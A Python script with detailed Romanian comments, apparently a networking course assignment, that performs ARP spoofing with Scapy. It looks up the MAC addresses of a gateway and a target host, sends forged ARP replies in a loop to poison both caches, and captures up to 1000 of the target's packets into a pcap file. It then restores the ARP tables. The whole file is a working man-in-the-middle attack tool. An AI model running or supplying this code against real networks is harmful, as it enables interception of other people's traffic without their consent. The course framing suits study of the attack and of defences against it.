# cod inspirat si updatat de aici:
# https://github.com/DariusBuhai/FMI-Unibuc/tree/main/Year%20II/Semester%202/Retele%20de%20calculatoare/Teme/Tema%202/arp_spoofing
import signal
from scapy.all import *
from scapy.layers.l2 import ARP

# ne pregatim parametrii necesari procesului de otravire
ipGateway = "198.7.0.1"
ipTarget = "198.7.0.2"
nbPackets = 1000  # nr maxim de pachete pe care le va captura functia 'sniff'


def findMAC(adresaIP):
    # raspuns = raspunsurile primite pentru pachetele trimise cu functia sr
    # sr = functie send-receive din biblioteca Scapy -> trimite un pachet si asteapta raspunsurile coraspunsunzatoare
    # nerezolvat = pachetele pentru care nu s-au primit raspunsuri in timpul apelului functiei sr
    raspuns, nerezolvat = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=adresaIP), retry=2, timeout=10)
    # Expresia r[ARP].hwsrc accesează adresa sursă MAC a unui pachet ARP (r) din biblioteca Scapy.
    # Mai exact, r este o instanță a clasei scapy.layers.l2.ARP, iar hwsrc este unul dintre
    # atributele acestei clase care reprezintă adresa MAC sursă a pachetului ARP.
    for s, r in raspuns:
        return r[ARP].hwsrc  # Accesând r[ARP].hwsrc, se obține valoarea adresei MAC sursă asociată pachetului r.
    return None


# Funcția ReloadNetwork este responsabilă de restabilirea configurației rețelei după finalizarea
# atacului ARP spoofing. Se ocupă de trimiterea de pachete ARP de tip "Reply" pentru a restaura configurația rețelei,
# oprirea forwarding-ului de IP și încheierea execuției programului.
def ReloadNetwork(ipGateway, MACgateway, ipTarget, MACtarget):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ipGateway, hwsrc=MACtarget, psrc=ipTarget), count=5)
    #  trimite un pachet ARP de tipul "Reply" către gateway-ul IP (ipGateway) cu adresa MAC sursă setată
    #  la adresa MAC a target-ului (MACtarget).
    #  Acest lucru are scopul de a anunța gateway-ul că adresa MAC a target-ului a fost restaurată.
    # Parametrul op=2 specifică faptul că este un pachet ARP de tip "Reply".
    # Parametrul hwdst="ff:ff:ff:ff:ff:ff" indică că adresa MAC destinație este adresa de broadcast,
    # ceea ce înseamnă că pachetul va fi transmis tuturor dispozitivelor din rețea.
    # Parametrul pdst=ipGateway specifică adresa IP destinație ca fiind adresa gateway-ului.
    # Parametrul hwsrc=MACtarget setează adresa MAC sursă a pachetului ca fiind adresa MAC a target-ului.
    # Parametrul psrc=ipTarget specifică adresa IP sursă ca fiind adresa target-ului.
    # Parametrul count=5 indică faptul că vor fi trimise 5 astfel de pachete ARP.

    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ipTarget, hwsrc=MACgateway, psrc=ipGateway), count=5)
    #  trimite un pachet ARP de tipul "Reply" către target-ul IP (ipTarget) cu adresa MAC sursă setată
    #  la adresa MAC a gateway-ului (MACgateway).
    #  Acest lucru are scopul de a anunța target-ul că adresa MAC a gateway-ului a fost restaurată.
    # Parametrii sunt similari cu cei din linia anterioară, dar adresa IP destinație (pdst) este setată
    # la adresa target-ului, iar adresa MAC sursă (hwsrc) este setată la adresa MAC a gateway-ului.

    print("Se opreste forward-ul de IP")
    os.system("sysctl -w net.inet.ip.forwarding=0")
    # utilizam modulul os pt a executa o comandă în linia de comandă a sistemului de operare
    # Comanda sysctl -w net.inet.ip.forwarding=0 oprește forwarding-ul de IP pe sistemul de operare.
    # Forwarding-ul de IP permite rutei de a transmite pachete între diferite interfețe de rețea.
    # Prin oprirea forwarding-ului, se restabilește configurația inițială a rețelei.

    os.kill(os.getpid(), signal.SIGTERM)  # încheiem execuția programului curent.
    # Funcția os.getpid() returnează ID-ul procesului curent, iar os.kill() este utilizată pentru a trimite semnalul
    # SIGTERM (terminare) către procesul cu ID-ul respectiv.
    # Astfel, programul se încheie și fluxul de execuție este întrerupt.


# Functia urmatoare  este responsabilă de declanșarea și menținerea atacului ARP spoofing, prin trimiterea periodică
# a pachetelor ARP de tip "Reply" între gateway și target
def start_arp_poison(ipGateway, MACgateway, ipTarget, MACtarget):
    print("S-a declansat atacul ARP!")
    try:
        while True:
            send(ARP(op=2, pdst=ipGateway, hwdst=MACgateway, psrc=ipTarget))
            # trimite un pachet ARP de tipul "Reply" către gateway-ul IP (ipGateway), având adresa MAC destinație setată
            # la adresa MAC a gateway-ului (MACgateway), iar adresa IP sursă setată la adresa IP a target-ului(ipTarget)
            # Parametrul op=2 specifică faptul că este un pachet ARP de tip "Reply".
            # Parametrul pdst=ipGateway specifică adresa IP destinație ca fiind adresa gateway-ului.
            # Parametrul hwdst=MACgateway setează adresa MAC destinație a pachetului ca fiind adresa MAC a gateway-ului.
            # Parametrul psrc=ipTarget specifică adresa IP sursă ca fiind adresa target-ului.

            send(ARP(op=2, pdst=ipTarget, hwdst=MACtarget, psrc=ipGateway))
            # trimite un pachet ARP de tipul "Reply" către target-ul IP (ipTarget), având adresa MAC destinație setată
            # la adresa MAC a target-ului (MACtarget), iar adresa IP sursă setată la adresa IP a gateway-ului(ipGateway)
            # Parametrii sunt similari cu cei din linia anterioară, dar adresa IP destinație (pdst) este setată la
            # adresa target-ului, iar adresa MAC destinație (hwdst) este setată la adresa MAC a target-ului.

            time.sleep(2)
            # punem în pauză execuția programului pentru 2 secunde si asiguram astfel un interval între trimiterea de
            # pachete consecutive.

    except KeyboardInterrupt:
        print("S-a oprit atacul ARP. Restoring network...")
        ReloadNetwork(ipGateway, MACgateway, ipTarget, MACtarget)
        #  apelam funcția ReloadNetwork pentru a restabili configurația rețelei.
        # Parametrii funcției sunt adresele IP și adresele MAC ale gateway-ului și target-ului


def run_arp_spoofing():
    print("Se porneste scriptul!")
    MACgateway = findMAC(ipGateway)  # obținem adresa MAC a gateway-ului (ipGateway)
    if MACgateway is None:
        print("Nu s-a putut obtine adresa MAC. Iesire...")
        sys.exit(0)
    else:
        print(f"Adresa Gateway MAC: {MACgateway}")

    MACtarget = findMAC(ipTarget)  # apelam funcția findMAC pentru a obține adresa MAC a target-ului (ipTarget)
    if MACtarget is None:
        print("Nu s-a putut obtine adresa MAC. Iesire...")
        sys.exit(0)
    else:
        print(f"Adresa MAC a Target-ului: {MACtarget}")

    firExecutieOtravire = threading.Thread(target=start_arp_poison, args=(ipGateway, MACgateway, ipTarget, MACtarget))
    #  cream un obiect de tip Thread care va rula funcția start_arp_poison într-un fir de execuție separat.
    # Parametrii funcției start_arp_poison sunt adresele IP și adresele MAC ale gateway-ului și target-ului.
    firExecutieOtravire.start()  # pornește firul de execuție care va declanșa atacul ARP spoofing.

    try:
        filtruTraficRetea = "ip host " + ipTarget
        # construim un filtru pentru capturarea traficului de rețea, care va fi limitat la pachetele care au adresa
        # IP destinație setată la adresa target-ului (ipTarget).
        # Filtrul este reprezentat sub forma unui șir de caractere.

        print(
            f"S-a inceput capturarea de trafic de retea (network capture). Packet Count: {nbPackets}. Filter: {filtruTraficRetea}")
        # captura de trafic de rețea a început; afisam și nr de pachete care vor fi capturate (nbPackets)
        # și filtrul utilizat.

        packets = sniff(filter=filtruTraficRetea, iface='eth0', count=nbPackets)
        # capturam pachetele de rețea care corespund filtrului specificat.
        # Parametrul filter indică filtrul utilizat, 'iface' specifică interfața de rețea de pe care se va realiza
        # captura (în acest caz, "eth0"), iar count indică numărul maxim de pachete care vor fi capturate.
        # Pachetele capturate sunt stocate în variabila packets

        wrpcap(ipTarget + "_capture.pcap", packets)
        #  salvam pachetele capturate într-un fișier de tipul PCAP.
        # Fișierul este denumit utilizând adresa IP a target-ului (ipTarget) și adăugând sufixul "_capture.pcap".

        print(f"Se opreste capturarea de trafic de retea (network capture), restoring network")
        ReloadNetwork(ipGateway, MACgateway, ipTarget, MACtarget)
        # Restabilim configurația rețelei.
        # Parametrii funcției sunt adresele IP și adresele MAC ale gateway-ului și target-ului.

    except KeyboardInterrupt:
        print(f"Se opreste capturarea de trafic de retea (network capture), restoring network")
        ReloadNetwork(ipGateway, MACgateway, ipTarget, MACtarget)
        sys.exit(0)
        # încheiem execuția programului cu un cod de ieșire 0, semnificând o încheiere normală.


if __name__ == '__main__':
    run_arp_spoofing()
